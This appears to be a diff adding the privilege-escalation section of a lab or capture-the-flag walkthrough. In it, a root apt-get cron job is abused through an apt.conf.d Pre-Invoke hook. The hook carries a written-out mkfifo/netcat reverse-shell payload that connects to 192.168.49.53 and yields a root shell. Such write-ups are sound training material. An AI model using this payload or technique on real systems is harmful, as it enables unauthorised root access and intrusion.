@@ -214,6 +214,31 @@ cool, we got a shell as user Franklin. Lets go ahead and escalate our privileges
 
 <h2>Privilege Escalation</h2>
 
+I found a cronjob running
+
+>command: cat /etc/crontab
+
+![image](https://user-images.githubusercontent.com/67879936/222933515-b9daefe4-8d3b-4f76-9b37-1ef33e3fc12f.png)
+
+I ran linpeas to look for writable files
+
+![image](https://user-images.githubusercontent.com/67879936/222934579-aebd7881-b6c3-47cd-ad1b-db0c53a9a096.png)
+
+To exploit this apt-get cronjob we will create a malicious inside the ```apt.conf.d``` file. When the apt-get cron job runs, it would install the malicious package, potentially us a shell as the root user.
+
+payload:```echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.53 80 >/tmp/f"};' > abeg```
+
+![image](https://user-images.githubusercontent.com/67879936/222934828-5a964dd7-bf6c-4ba1-8156-27413e22c846.png)
+
+Now ensure you have your netcat listner set up, so you can get a shell as root user back on your listener this is because apt-get update is set to update the packages everytime with root privileges.
+
+![image](https://user-images.githubusercontent.com/67879936/222934899-71cf2d03-24ac-473a-bfca-af346f8db365.png)
+
+Boom!!! We got a shell as the root user
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
